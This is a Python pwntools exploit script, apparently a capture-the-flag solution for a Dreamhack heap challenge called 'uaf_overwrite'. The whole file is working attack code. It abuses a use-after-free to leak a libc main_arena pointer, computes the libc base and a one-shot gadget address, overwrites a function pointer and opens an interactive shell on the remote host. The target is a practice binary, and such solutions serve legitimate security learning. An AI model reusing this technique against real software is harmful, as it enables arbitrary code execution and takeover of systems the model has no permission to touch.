from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/uaf_overwrite')
    mainarena_offset = 0x3ebc40
    oneshot_offset = 0x10a2fc
else:
    r = remote('host1.dreamhack.games', 15064)
    mainarena_offset = 0x3ebc40
    oneshot_offset = 0x10a41c

sla = r.sendlineafter
sa = r.sendafter

def human(weight, age):
    sla('> ', '1')
    sla('Human Weight: ', str(weight))
    sla('Human Age: ', str(age))

def robot(weight):
    sla('> ', '2')
    sla('Robot Weight: ', str(weight))

def custom(size, data, idx):
    sla('> ', '3')
    sla('Size: ', str(size))
    if size >= 0x100:
        sa('Data: ', data)
        r.recvuntil('Data: ')
        data = r.recvline()[:-1]
        sla('Free idx: ', str(idx))
        return data


# leak libc

custom(0x500, 'a', 1)
robot(1)  # prevent coalescence
custom(0x100, 'a', 0)

mainarena = u64(custom(0x500, 'a' * 8, 0)[-6:].ljust(8, b'\x00')) - 96  # main_arena
libc = mainarena - mainarena_offset  # libc base
oneshot = libc + oneshot_offset  # oneshot gadget


# call oneshot gadget

human(1, oneshot)
robot(1)


r.interactive()